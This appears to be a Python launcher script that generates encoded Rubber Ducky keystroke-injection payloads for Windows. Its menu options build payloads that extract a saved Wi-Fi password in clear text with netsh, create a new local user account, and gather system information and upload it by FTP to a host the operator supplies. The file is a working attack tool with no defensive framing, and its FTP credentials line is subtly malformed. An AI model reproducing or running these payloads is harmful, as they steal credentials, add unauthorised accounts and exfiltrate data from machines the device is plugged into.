#!usr/bin/python env

from pyfiglet import Figlet
import os


f = Figlet(font='slant')
print (f.renderText('RD - Launcher'))

questions = True
while questions:
    print("""
[ 1 ] Create wifi password extractor
[ 2 ] Create user local
[ 3 ] Systeminfo and send to FTP
[ 4 ] Exit
    """)

    questions = input("Select your choise: ")
    if questions == "1":
        ssid = input("Enter SSID: ")
        language = input("Enter language keyboard: ")
        delay = input("Enter Delay initial(ms): ")
        file = open("wifi.txt", "w")
        file.write("DELAY " + delay + "\n")
        file.write("GUI r\n")
        file.write("DELAY 1000\n")
        file.write("STRING powershell\n")
        file.write("ENTER\n")
        file.write("DELAY 2000\n")
        file.write("STRING netsh.exe wlan show profile name=" + ssid + " key=clear\n")
        file.write("ENTER")
        file.close()
        os.system(f"java -jar encoder/encoder.jar -i wifi.txt -o inject.bin -l {language}\n")
        print("File create: inject.bin")
        os.remove("wifi.txt")
        break
    elif questions == "2":
        user = input("Enter your username: ")
        passwd = input("Enter your password: ")
        language = input("Enter language keyboard: ")
        delay = input("Enter Delay initial(ms): ")
        file = open("createUser.txt", "w")
        file.write("DELAY " + delay + "\n")
        file.write("GUI r\n")
        file.write("DELAY 1000\n")
        file.write("STRING powershell\n")
        file.write("ENTER\n")
        file.write("DELAY 2000\n")
        file.write('STRING $username = "' + user + '"\n')
        file.write("ENTER\n")
        file.write('STRING $password = ConvertTo-SecureString "' + passwd + '" -AsPlainText -Force\n')
        file.write("ENTER\n")
        file.write('STRING New-LocalUser -Name "' + user + '" -Password $password -FullName "' + user + '" -Description "Test user"\n')
        file.write("ENTER\n")
        file.write("STRING exit")
        file.write("ENTER")
        file.close()
        os.system(f"java -jar encoder/encoder.jar -i createUser.txt -o inject.bin -l {language}\n")
        print("File create: inject.bin")
        os.remove("createUser.txt")
        break
    elif questions == "3":
        userFTP = input("Enter user FTP: ")
        passFTP = input("Enter password FTP: ")
        ipFTP = input("Enter IP FTP: ")
        language = input("Enter language keyboard: ")
        delay = input("Enter Delay initial(ms): ")
        file = open("systemInfo.txt", "w")
        file.write("DELAY " + delay + "\n")
        file.write("GUI r\n")
        file.write("DELAY 1000\n")
        file.write("STRING powershell\n")
        file.write("ENTER\n")
        file.write("DELAY 2000\n")
        file.write("STRING systeminfo.exe > systemInfo.txt\n")
        file.write("ENTER\n")
        file.write('STRING $client = New-Object System.Net.WebClient\n')
        file.write("ENTER\n")
        file.write('STRING $client.Credentials = New-Object System.Net.NetworkCredential("' + userFTP + '"',  '"' + passFTP + '")\n')
        file.write("ENTER\n")
        file.write('STRING $client.UploadFile("ftp://' + ipFTP + '/systemInfo.txt", "systemInfo.txt")\n')
        file.write("ENTER\n")
        file.write("STRING exit\n")
        file.write("ENTER")
        file.close()
        os.system(f"java -jar encoder/encoder.jar -i systemInfo.txt -o inject.bin -l {language}\n")
        print("File create: inject.bin")
        #os.remove("systemInfo.txt")
    elif questions == "4":
        print('Stop program!!!')
        break